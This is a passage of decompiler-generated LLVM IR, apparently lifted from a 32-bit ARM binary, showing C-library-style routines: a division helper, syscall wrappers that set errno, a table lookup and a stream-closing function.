dec_label_pc_cb2c:                                ; preds = %thread-pre-split
  br i1 %v1_ca74, label %bb100, label %.thread16

bb100:                                            ; preds = %dec_label_pc_cb2c
  %v2_cb30 = sub i32 0, %v0_ca78
  br label %.thread16

dec_label_pc_cb38:                                ; preds = %bb85
  br i1 %v3_ca94, label %bb102, label %bb101

bb101:                                            ; preds = %dec_label_pc_cb38
  br label %bb102

bb102:                                            ; preds = %dec_label_pc_cb38, %bb101
  %v1_cb4480 = phi i32 [ %v0_ca78, %dec_label_pc_cb38 ], [ 0, %bb101 ]
  br i1 %v9_ca94, label %bb103, label %.thread16

bb103:                                            ; preds = %bb102
  %v4_cb3c = ashr i32 %v2_ca78, 31
  %v2_cb40 = or i32 %v4_cb3c, 1
  br label %.thread16

dec_label_pc_cb48:                                ; preds = %dec_label_pc_ca9c
  %v2_cb48 = icmp ugt i32 %v1_cb4c, 65535
  br i1 %v2_cb48, label %bb104, label %.thread19

bb104:                                            ; preds = %dec_label_pc_cb48
  %v2_cb4c = and i32 %v1_cb4c, 32768
  %v3_cb4c = icmp eq i32 %v2_cb4c, 0
  %v4_cb4c = udiv i32 %v1_cb4c, 65536
  br i1 %v3_cb4c, label %.thread19, label %bb105

.thread19:                                        ; preds = %bb104, %dec_label_pc_cb48
  %v0_cb5870 = phi i32 [ %v1_cb4c, %dec_label_pc_cb48 ], [ %v4_cb4c, %bb104 ]
  br label %bb105

bb105:                                            ; preds = %bb104, %.thread19
  %v1_cb5c = phi i32 [ %v0_cb5870, %.thread19 ], [ %v4_cb4c, %bb104 ]
  %storemerge = phi i32 [ 0, %.thread19 ], [ 16, %bb104 ]
  %v2_cb58 = icmp ugt i32 %v1_cb5c, 255
  br i1 %v2_cb58, label %bb106, label %.thread20

bb106:                                            ; preds = %bb105
  %v2_cb5c = and i32 %v1_cb5c, 128
  %v3_cb5c = icmp eq i32 %v2_cb5c, 0
  %v4_cb5c = udiv i32 %v1_cb5c, 256
  br i1 %v3_cb5c, label %.thread20, label %bb107

bb107:                                            ; preds = %bb106
  %v2_cb60 = or i32 %storemerge, 8
  br label %.thread20

.thread20:                                        ; preds = %bb106, %bb105, %bb107
  %v1_cb6c = phi i32 [ %storemerge, %bb105 ], [ %storemerge, %bb106 ], [ %v2_cb60, %bb107 ]
  %v1_cb68 = phi i32 [ %v1_cb5c, %bb105 ], [ %v4_cb5c, %bb106 ], [ %v4_cb5c, %bb107 ]
  %v2_cb64 = icmp ugt i32 %v1_cb68, 15
  br i1 %v2_cb64, label %bb108, label %.thread21

bb108:                                            ; preds = %.thread20
  %v2_cb68 = and i32 %v1_cb68, 8
  %v3_cb68 = icmp eq i32 %v2_cb68, 0
  %v4_cb68 = udiv i32 %v1_cb68, 16
  br i1 %v3_cb68, label %.thread21, label %bb109

bb109:                                            ; preds = %bb108
  %v2_cb6c = add nsw i32 %v1_cb6c, 4
  br label %.thread21

.thread21:                                        ; preds = %bb108, %.thread20, %bb109
  %v4_cb74 = phi i32 [ %v1_cb6c, %.thread20 ], [ %v1_cb6c, %bb108 ], [ %v2_cb6c, %bb109 ]
  %v5_cb78 = phi i32 [ %v1_cb68, %.thread20 ], [ %v4_cb68, %bb108 ], [ %v4_cb68, %bb109 ]
  %v2_cb70 = icmp ugt i32 %v5_cb78, 3
  %v7_cb70 = icmp eq i32 %v5_cb78, 4
  %v2_cb74 = xor i1 %v7_cb70, true
  %v3_cb74 = and i1 %v2_cb70, %v2_cb74
  br i1 %v3_cb74, label %bb110, label %bb111

bb110:                                            ; preds = %.thread21
  %v5_cb74 = add nsw i32 %v4_cb74, 3
  br label %bb111

bb111:                                            ; preds = %.thread21, %bb110
  %v4_cb78 = phi i32 [ %v4_cb74, %.thread21 ], [ %v5_cb74, %bb110 ]
  %v2_cb78 = xor i1 %v2_cb70, true
  %v3_cb78 = or i1 %v7_cb70, %v2_cb78
  br i1 %v3_cb78, label %bb112, label %bb113

bb112:                                            ; preds = %bb111
  %v8_cb78 = udiv i32 %v5_cb78, 2
  %v9_cb78 = add i32 %v4_cb78, %v8_cb78
  br label %bb113

bb113:                                            ; preds = %bb111, %bb112
  %v1_cb80 = phi i32 [ %v4_cb78, %bb111 ], [ %v9_cb78, %bb112 ]
  %v1_cb7c = icmp slt i32 %v2_ca78, 0
  %v6_cb80 = lshr i32 %v0_cb80, %v1_cb80
  %v2_cb84 = sub i32 0, %v6_cb80
  %v2_cb84.v6_cb80 = select i1 %v1_cb7c, i32 %v2_cb84, i32 %v6_cb80
  ret i32 %v2_cb84.v6_cb80

dec_label_pc_cb8c:                                ; preds = %dec_label_pc_ca74
  %v0_cb8c = load i32, i32* @lr, align 4
  %v0_cb90 = call i32 @function_cbb8()
  store i32 %v0_cb8c, i32* @lr, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_cb78, { 1, 0 }
  uselistorder i1 %v7_cb70, { 1, 0 }
  uselistorder i32 %v4_cb68, { 1, 0 }
  uselistorder i32 %v1_cb68, { 1, 0, 2, 3 }
  uselistorder i32 %v4_cb5c, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v1_cb5c, { 1, 0, 2, 3 }
  uselistorder i32 %v4_cb4c, { 1, 0 }
  uselistorder i32 %v0_cb10, { 1, 0 }
  uselistorder i32 %v4_cb04, { 1, 0 }
  uselistorder i32 %v1_cb0c, { 1, 2, 0 }
  uselistorder i32 %v4_caf8, { 1, 0 }
  uselistorder i32 %v1_cb00, { 1, 2, 0 }
  uselistorder i32 %v4_caec, { 1, 0 }
  uselistorder i32 %v1_caf4, { 1, 2, 0 }
  uselistorder i32 %v1_cb18, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_cae8, { 1, 0 }
  uselistorder i32 %v1_cb14, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_cad4, { 1, 0 }
  uselistorder i32 %v3_cad0, { 1, 0 }
  uselistorder i32 %v1_cad0, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_cacc, { 1, 0 }
  uselistorder i32 %v1_cad4, { 1, 2, 0, 3 }
  uselistorder i32 %v4_cac0, { 1, 0 }
  uselistorder i32 %v4_cabc, { 2, 1, 0 }
  uselistorder i32 %v1_cac0, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_cac8.pr40, { 1, 2, 0, 5, 4, 3 }
  uselistorder i1 %v3_ca94, { 1, 0 }
  uselistorder i32 %v1_cb4c, { 5, 1, 6, 7, 3, 2, 0, 4, 8, 9, 10, 11 }
  uselistorder i32 %v2_ca78, { 1, 0, 2 }
  uselistorder i32 %v0_ca78, { 2, 1, 3, 4, 5, 0 }
  uselistorder i32 %v0_ca74, { 2, 1, 0, 4, 3 }
  uselistorder i32 ()* @function_cbb8, { 1, 0 }
  uselistorder label %bb113, { 1, 0 }
  uselistorder label %bb111, { 1, 0 }
  uselistorder label %.thread21, { 2, 0, 1 }
  uselistorder label %.thread20, { 2, 0, 1 }
  uselistorder label %bb105, { 1, 0 }
  uselistorder label %bb102, { 1, 0 }
  uselistorder label %.thread16, { 0, 1, 2, 3, 5, 4 }
  uselistorder label %dec_label_pc_cb20, { 1, 0 }
  uselistorder label %thread-pre-split12, { 0, 2, 1 }
  uselistorder label %.thread10, { 2, 0, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %dec_label_pc_cadc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_cac8thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
  uselistorder label %bb85, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
}

define i32 @function_cba0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_cba0:
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %v0_cba4 = call i32 @function_ca74()
  ret i32 %v0_cba4
}

define i32 @function_cbb8() local_unnamed_addr {
dec_label_pc_cbb8:
  %v1_cbc0 = call i32 @function_fccc(i32 8)
  ret i32 %v1_cbc0
}

define i32 @function_cbcc() local_unnamed_addr {
dec_label_pc_cbcc:
  %v1_cbdc = load i32, i32* @r0, align 4
  ret i32 %v1_cbdc
}

define i32 @function_cbe0() local_unnamed_addr {
dec_label_pc_cbe0:
  %v1_cbf0 = load i32, i32* @r0, align 4
  ret i32 %v1_cbf0
}

define i32 @function_cbf4(i32* %arg1) local_unnamed_addr {
dec_label_pc_cbf4:
  %stack_var_-16 = alloca i32, align 4
  %v2_cbf8 = ptrtoint i32* %stack_var_-16 to i32
  %v2_cc08 = call i32 @function_cce8(i32 %v2_cbf8, i32 0)
  %v2_cc0c = load i32, i32* %stack_var_-16, align 4
  %v2_cc10 = icmp eq i32* %arg1, null
  br i1 %v2_cc10, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_cbf4
  store i32 %v2_cc0c, i32* %arg1, align 4
  br label %bb6

bb6:                                              ; preds = %dec_label_pc_cbf4, %bb
  ret i32 %v2_cc0c

; uselistorder directives
  uselistorder label %bb6, { 1, 0 }
}

define i32 @function_cc24(i32 %arg1) local_unnamed_addr {
dec_label_pc_cc24:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_cc24 = load i32, i32* @r7, align 4
  store i32 %v3_cc24, i32* %stack_var_-8, align 4
  %v0_cc30 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_cc30, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_cc30, -4095
  br i1 %tmp, label %dec_label_pc_cc50, label %dec_label_pc_cc40

dec_label_pc_cc40:                                ; preds = %dec_label_pc_cc24
  %v0_cc40 = call i32 @function_ce08()
  %v0_cc44 = load i32, i32* %r7.global-to-local, align 4
  %v1_cc44 = sub i32 0, %v0_cc44
  %v2_cc48 = inttoptr i32 %v0_cc40 to i32*
  store i32 %v1_cc44, i32* %v2_cc48, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_cc50.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_cc50

dec_label_pc_cc50:                                ; preds = %dec_label_pc_cc24, %dec_label_pc_cc40
  %v1_cc54 = phi i32 [ %v0_cc30, %dec_label_pc_cc24 ], [ -1, %dec_label_pc_cc40 ]
  %v2_cc50 = phi i32 [ %v3_cc24, %dec_label_pc_cc24 ], [ %v2_cc50.pre, %dec_label_pc_cc40 ]
  store i32 %v2_cc50, i32* @r7, align 4
  ret i32 %v1_cc54

; uselistorder directives
  uselistorder i32 %v0_cc30, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_cc50, { 1, 0 }
}

define i32 @function_cc58(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_cc58:
  %v0_cc64 = call i32 @function_12360()
  ret i32 %v0_cc64
}

define i32 @function_cc74(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_cc74:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_cca4, label %dec_label_pc_cc94

dec_label_pc_cc94:                                ; preds = %dec_label_pc_cc74
  %v0_cc94 = call i32 @function_ce08()
  %v0_cc98 = load i32, i32* %r4.global-to-local, align 4
  %v1_cc98 = sub i32 0, %v0_cc98
  %v2_cc9c = inttoptr i32 %v0_cc94 to i32*
  store i32 %v1_cc98, i32* %v2_cc9c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_cca4

dec_label_pc_cca4:                                ; preds = %dec_label_pc_cc74, %dec_label_pc_cc94
  %v0_cca4 = phi i32 [ %arg1, %dec_label_pc_cc74 ], [ -1, %dec_label_pc_cc94 ]
  ret i32 %v0_cca4

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_cca4, { 1, 0 }
}

define i32 @function_ccb4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_ccb4:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_ccb4 = load i32, i32* @r7, align 4
  store i32 %v3_ccb4, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_ccdc, label %dec_label_pc_cccc

dec_label_pc_cccc:                                ; preds = %dec_label_pc_ccb4
  %v0_cccc = call i32 @function_ce08()
  %v0_ccd0 = load i32, i32* %r7.global-to-local, align 4
  %v1_ccd0 = sub i32 0, %v0_ccd0
  store i32 %v1_ccd0, i32* @r3, align 4
  %v2_ccd4 = inttoptr i32 %v0_cccc to i32*
  store i32 %v1_ccd0, i32* %v2_ccd4, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_cce0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_ccdc

dec_label_pc_ccdc:                                ; preds = %dec_label_pc_ccb4, %dec_label_pc_cccc
  %v2_cce0 = phi i32 [ %v3_ccb4, %dec_label_pc_ccb4 ], [ %v2_cce0.pre, %dec_label_pc_cccc ]
  %v0_ccdc = phi i32 [ %arg1, %dec_label_pc_ccb4 ], [ -1, %dec_label_pc_cccc ]
  store i32 %v2_cce0, i32* @r7, align 4
  ret i32 %v0_ccdc

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ccdc, { 1, 0 }
}

define i32 @function_cce8(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_cce8:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_cce8 = load i32, i32* @r7, align 4
  store i32 %v3_cce8, i32* %stack_var_-8, align 4
  %v0_ccf4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_ccf4, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_ccf4, -4095
  br i1 %tmp, label %dec_label_pc_cd14, label %dec_label_pc_cd04

dec_label_pc_cd04:                                ; preds = %dec_label_pc_cce8
  %v0_cd04 = call i32 @function_ce08()
  %v0_cd08 = load i32, i32* %r7.global-to-local, align 4
  %v1_cd08 = sub i32 0, %v0_cd08
  %v2_cd0c = inttoptr i32 %v0_cd04 to i32*
  store i32 %v1_cd08, i32* %v2_cd0c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_cd14.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_cd14

dec_label_pc_cd14:                                ; preds = %dec_label_pc_cce8, %dec_label_pc_cd04
  %v1_cd18 = phi i32 [ %v0_ccf4, %dec_label_pc_cce8 ], [ -1, %dec_label_pc_cd04 ]
  %v2_cd14 = phi i32 [ %v3_cce8, %dec_label_pc_cce8 ], [ %v2_cd14.pre, %dec_label_pc_cd04 ]
  store i32 %v2_cd14, i32* @r7, align 4
  ret i32 %v1_cd18

; uselistorder directives
  uselistorder i32 %v0_ccf4, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_cd14, { 1, 0 }
}

define i32 @function_cd1c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_cd1c:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_cd1c = load i32, i32* @r7, align 4
  store i32 %v3_cd1c, i32* %stack_var_-8, align 4
  %v0_cd28 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_cd28, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_cd28, -4095
  br i1 %tmp, label %dec_label_pc_cd48, label %dec_label_pc_cd38

dec_label_pc_cd38:                                ; preds = %dec_label_pc_cd1c
  %v0_cd38 = call i32 @function_ce08()
  %v0_cd3c = load i32, i32* %r7.global-to-local, align 4
  %v1_cd3c = sub i32 0, %v0_cd3c
  %v2_cd40 = inttoptr i32 %v0_cd38 to i32*
  store i32 %v1_cd3c, i32* %v2_cd40, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_cd48.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_cd48

dec_label_pc_cd48:                                ; preds = %dec_label_pc_cd1c, %dec_label_pc_cd38
  %v1_cd4c = phi i32 [ %v0_cd28, %dec_label_pc_cd1c ], [ -1, %dec_label_pc_cd38 ]
  %v2_cd48 = phi i32 [ %v3_cd1c, %dec_label_pc_cd1c ], [ %v2_cd48.pre, %dec_label_pc_cd38 ]
  store i32 %v2_cd48, i32* @r7, align 4
  ret i32 %v1_cd4c

; uselistorder directives
  uselistorder i32 %v0_cd28, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_cd48, { 1, 0 }
}

define i32 @function_cd50(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_cd50:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v9_cd50 = load i32, i32* @r3, align 4
  store i32 %v9_cd50, i32* %stack_var_-4, align 4
  %v2_cd5c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_cd5c, i32* @r3, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_cd90, label %dec_label_pc_cd80

dec_label_pc_cd80:                                ; preds = %dec_label_pc_cd50
  %v0_cd80 = call i32 @function_ce08()
  %v0_cd84 = load i32, i32* %r7.global-to-local, align 4
  %v1_cd84 = sub i32 0, %v0_cd84
  store i32 %v1_cd84, i32* @r3, align 4
  %v2_cd88 = inttoptr i32 %v0_cd80 to i32*
  store i32 %v1_cd84, i32* %v2_cd88, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_cd90

dec_label_pc_cd90:                                ; preds = %dec_label_pc_cd50, %dec_label_pc_cd80
  %v0_cd90 = phi i32 [ %arg1, %dec_label_pc_cd50 ], [ -1, %dec_label_pc_cd80 ]
  ret i32 %v0_cd90

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_cd90, { 1, 0 }
}

define i32 @function_cda4(i32 %arg1) local_unnamed_addr {
dec_label_pc_cda4:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_cda4 = load i32, i32* @r7, align 4
  store i32 %v3_cda4, i32* %stack_var_-8, align 4
  %v0_cdb0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_cdb0, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_cdb0, -4095
  br i1 %tmp, label %dec_label_pc_cdd0, label %dec_label_pc_cdc0

dec_label_pc_cdc0:                                ; preds = %dec_label_pc_cda4
  %v0_cdc0 = call i32 @function_ce08()
  %v0_cdc4 = load i32, i32* %r7.global-to-local, align 4
  %v1_cdc4 = sub i32 0, %v0_cdc4
  %v2_cdc8 = inttoptr i32 %v0_cdc0 to i32*
  store i32 %v1_cdc4, i32* %v2_cdc8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_cdd0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_cdd0

dec_label_pc_cdd0:                                ; preds = %dec_label_pc_cda4, %dec_label_pc_cdc0
  %v1_cdd4 = phi i32 [ %v0_cdb0, %dec_label_pc_cda4 ], [ -1, %dec_label_pc_cdc0 ]
  %v2_cdd0 = phi i32 [ %v3_cda4, %dec_label_pc_cda4 ], [ %v2_cdd0.pre, %dec_label_pc_cdc0 ]
  store i32 %v2_cdd0, i32* @r7, align 4
  ret i32 %v1_cdd4

; uselistorder directives
  uselistorder i32 %v0_cdb0, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_cdd0, { 1, 0 }
}

define i32 @function_cdd8(i32 %arg1) local_unnamed_addr {
dec_label_pc_cdd8:
  %v1_cddc = add i32 %arg1, 128
  %v2_cde0 = icmp ugt i32 %v1_cddc, 383
  %v0_cde8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_cde0, i32 %v0_cde8)
  %v4_cdf0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_15cf0.246 to i32), i32 53052) to i32*), align 4
  %v2_cdf4 = mul i32 %arg1, 2
  %v2_cdf8 = add i32 %v4_cdf0, %v2_cdf4
  %v3_cdf8 = inttoptr i32 %v2_cdf8 to i16*
  %v4_cdf8 = load i16, i16* %v3_cdf8, align 2
  %v6_cdf8 = sext i16 %v4_cdf8 to i32
  ret i32 %v6_cdf8
}

define i32 @function_ce08() local_unnamed_addr {
dec_label_pc_ce08:
  store i32 142044, i32* @r3, align 4
  ret i32 ptrtoint (i32* @global_var_254d4.250 to i32)
}

define i32 @function_ce24(i16* %arg1) local_unnamed_addr {
dec_label_pc_ce24:
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_ce24 = load i32, i32* @r4, align 4
  store i32 %v3_ce24, i32* %stack_var_-36, align 4
  %v6_ce24 = load i32, i32* @r5, align 4
  %v9_ce24 = load i32, i32* @r6, align 4
  %v12_ce24 = load i32, i32* @r7, align 4
  %v15_ce24 = load i32, i32* @r8, align 4
  %v27_ce24 = load i32, i32* @lr, align 4
  %v2_ce28 = add i32 %tmp, 52
  %v3_ce28 = inttoptr i32 %v2_ce28 to i32*
  %v4_ce28 = load i32, i32* %v3_ce28, align 4
  %v1_ce30 = sub i32 1, %v4_ce28
  %v2_ce30 = icmp ult i32 %v4_ce28, 2
  br i1 %v2_ce30, label %bb18, label %bb

bb:                                               ; preds = %dec_label_pc_ce24
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_ce24, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v1_ce30, %dec_label_pc_ce24 ]
  %v0_ce38 = phi i32 [ 0, %bb ], [ %v1_ce30, %dec_label_pc_ce24 ]
  store i32 %storemerge, i32* %sb.global-to-local, align 4
  %v2_ce38 = icmp eq i32 %v0_ce38, 0
  store i32 %tmp, i32* @r5, align 4
  store i32 142044, i32* @r6, align 4
  br i1 %v2_ce38, label %dec_label_pc_ce84, label %dec_label_pc_ce4c

dec_label_pc_ce4c:                                ; preds = %bb18
  %v4_ce64 = load i32, i32* inttoptr (i32 142120 to i32*), align 8
  call void @__pseudo_branch(i32 %v4_ce64)
  %v0_ce78 = load i32, i32* @r6, align 4
  %v2_ce78 = add i32 %v0_ce78, 16
  %v3_ce78 = inttoptr i32 %v2_ce78 to i32*
  %v4_ce78 = load i32, i32* %v3_ce78, align 4
  call void @__pseudo_branch(i32 %v4_ce78)
  %v0_ce84.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_ce84

dec_label_pc_ce84:                                ; preds = %bb18, %dec_label_pc_ce4c
  %v1_ce8c = phi i32 [ %tmp, %bb18 ], [ %v0_ce84.pre, %dec_label_pc_ce4c ]
  %v1_ce84 = inttoptr i32 %v1_ce8c to i16*
  %v2_ce84 = load i16, i16* %v1_ce84, align 2
  %v3_ce84 = zext i16 %v2_ce84 to i32
  %v1_ce88 = and i32 %v3_ce84, 64
  %v2_ce88 = icmp eq i32 %v1_ce88, 0
  br i1 %v2_ce88, label %bb20, label %bb19

bb19:                                             ; preds = %dec_label_pc_ce84
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_ce84, %bb19
  %storemerge26 = phi i32 [ %v1_ce8c, %bb19 ], [ %v1_ce88, %dec_label_pc_ce84 ]
  %v1_ce90 = xor i1 %v2_ce88, true
  call void @__pseudo_cond_branch(i1 %v1_ce90, i32 ptrtoint (i32* @global_var_ed9c.255 to i32))
  store i32 %storemerge26, i32* %sl.global-to-local, align 4
  %v0_ce98 = load i32, i32* @r5, align 4
  %v1_ce98 = add i32 %v0_ce98, 4
  %v2_ce98 = inttoptr i32 %v1_ce98 to i32*
  %v3_ce98 = load i32, i32* %v2_ce98, align 4
  %v1_ce9c = call i32 @function_cda4(i32 %v3_ce98)
  %v0_cea4 = load i32, i32* @r6, align 4
  %v2_ceb0 = add i32 %v0_cea4, 112
  %v3_ceb0 = inttoptr i32 %v2_ceb0 to i32*
  %v4_ceb0 = load i32, i32* %v3_ceb0, align 4
  store i32 %v4_ceb0, i32* @r7, align 4
  %v1_ceb8 = load i32, i32* @r5, align 4
  %v2_ceb8 = add i32 %v1_ceb8, 4
  %v3_ceb8 = inttoptr i32 %v2_ceb8 to i32*
  store i32 -1, i32* %v3_ceb8, align 4
  %v0_cec0 = load i32, i32* @r6, align 4
  %v2_cec0 = add i32 %v0_cec0, 76
  %v3_cec0 = inttoptr i32 %v2_cec0 to i32*
  %v4_cec0 = load i32, i32* %v3_cec0, align 4
  %v1_cec8 = icmp slt i32 %v1_ce9c, 0
  store i32 %v4_cec0, i32* %stack_var_-80, align 4
  br i1 %v1_cec8, label %bb21, label %bb22

bb21:                                             ; preds = %bb20
  store i32 -1, i32* %sl.global-to-local, align 4
  br label %bb22

bb22:                                             ; preds = %bb20, %bb21
  call void @__pseudo_branch(i32 %v4_cec0)
  %v0_cef0 = load i32, i32* @r6, align 4
  %v2_cef0 = add i32 %v0_cef0, 16
  %v3_cef0 = inttoptr i32 %v2_cef0 to i32*
  %v4_cef0 = load i32, i32* %v3_cef0, align 4
  call void @__pseudo_branch(i32 %v4_cef0)
  %v0_cf00 = load i32, i32* @r6, align 4
  %v2_cf00 = add i32 %v0_cf00, 12
  %v3_cf00 = inttoptr i32 %v2_cf00 to i32*
  %v4_cf00 = load i32, i32* %v3_cf00, align 4
  %v1_cf04 = inttoptr i32 %v4_cf00 to i32*
  %v2_cf04 = load i32, i32* %v1_cf04, align 4
  %v1_cf0c = add i32 %v2_cf04, 1
  %v2_cf10 = add i32 %v0_cf00, 24
  %v3_cf10 = inttoptr i32 %v2_cf10 to i32*
  %v4_cf10 = load i32, i32* %v3_cf10, align 4
  store i32 %v4_cf10, i32* @r4, align 4
  store i32 %v1_cf0c, i32* %v1_cf04, align 4
  call void @__pseudo_branch(i32 %v4_cf10)
  %v0_cf28 = load i32, i32* @r5, align 4
  %v1_cf28 = inttoptr i32 %v0_cf28 to i16*
  %v2_cf28 = load i16, i16* %v1_cf28, align 2
  %v1_cf2c = and i16 %v2_cf28, 24576
  %v1_cf30 = or i16 %v1_cf2c, 48
  %v0_cf34 = load i32, i32* %sb.global-to-local, align 4
  %v2_cf34 = icmp eq i32 %v0_cf34, 0
  store i16 %v1_cf30, i16* %v1_cf28, align 2
  br i1 %v2_cf34, label %.thread, label %bb23

bb23:                                             ; preds = %bb22
  br label %.thread

.thread:                                          ; preds = %bb22, %bb23
  %v2_cf48 = xor i1 %v2_cf34, true
  call void @__pseudo_cond_branch(i1 %v2_cf48, i32 %v4_cf10)
  %v0_cf4c = load i32, i32* @r5, align 4
  %v1_cf4c = inttoptr i32 %v0_cf4c to i16*
  %v2_cf4c = load i16, i16* %v1_cf4c, align 2
  %v1_cf50 = and i16 %v2_cf4c, 16384
  %v2_cf50 = icmp eq i16 %v1_cf50, 0
  br i1 %v2_cf50, label %bb25, label %bb24

bb24:                                             ; preds = %.thread
  br label %bb25

bb25:                                             ; preds = %.thread, %bb24
  %v1_cf58 = xor i1 %v2_cf50, true
  call void @__pseudo_cond_branch(i1 %v1_cf58, i32 ptrtoint (i32* @global_var_108e4.259 to i32))
  %v2_cf64 = load i32, i32* %stack_var_-80, align 4
  call void @__pseudo_branch(i32 %v2_cf64)
  call void @__pseudo_branch(i32 %v4_cef0)
  %v0_cf84 = load i32, i32* @r6, align 4
  %v2_cf84 = add i32 %v0_cf84, 52
  %v3_cf84 = inttoptr i32 %v2_cf84 to i32*
  %v4_cf84 = load i32, i32* %v3_cf84, align 4
  %v1_cf88 = inttoptr i32 %v4_cf84 to i32*
  %v2_cf88 = load i32, i32* %v1_cf88, align 4
  %v1_cf8c = add i32 %v2_cf88, 1
  store i32 %v1_cf8c, i32* %v1_cf88, align 4
  call void @__pseudo_branch(i32 %v4_cf10)
  %v0_cfa4 = call i32 @function_ec14()
  %v0_cfa8 = load i32, i32* %sl.global-to-local, align 4
  %v2_cfb0 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_cfb0, i32* @r4, align 4
  store i32 %v6_ce24, i32* @r5, align 4
  store i32 %v9_ce24, i32* @r6, align 4
  store i32 %v12_ce24, i32* @r7, align 4
  store i32 %v15_ce24, i32* @r8, align 4
  store i32 %v27_ce24, i32* @lr, align 4
  ret i32 %v0_cfa8

; uselistorder directives
  uselistorder i1 %v2_cf50, { 1, 0 }
  uselistorder i32 %v4_cf10, { 0, 2, 1, 3 }
  uselistorder i32 %v4_ce28, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder i32* %sb.global-to-local, { 1, 0 }
  uselistorder label %bb25, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
